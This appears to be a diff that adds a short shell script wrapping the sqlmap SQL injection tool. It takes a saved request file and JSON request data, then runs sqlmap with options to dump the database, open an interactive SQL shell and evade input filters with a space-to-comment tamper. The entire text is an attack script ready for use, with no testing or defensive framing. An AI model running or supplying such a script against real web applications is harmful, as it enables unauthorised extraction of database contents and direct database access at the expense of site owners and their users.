@@ -1,0 +1,5 @@
+#Type Json data into Request Data like {data:value,data:value}
+read -p 'Enter Request File: ' req
+read -p 'Enter Request Data: ' dat
+
+sqlmap -r $req --dump --sql-shell --data=$dat --tamper=space2comment
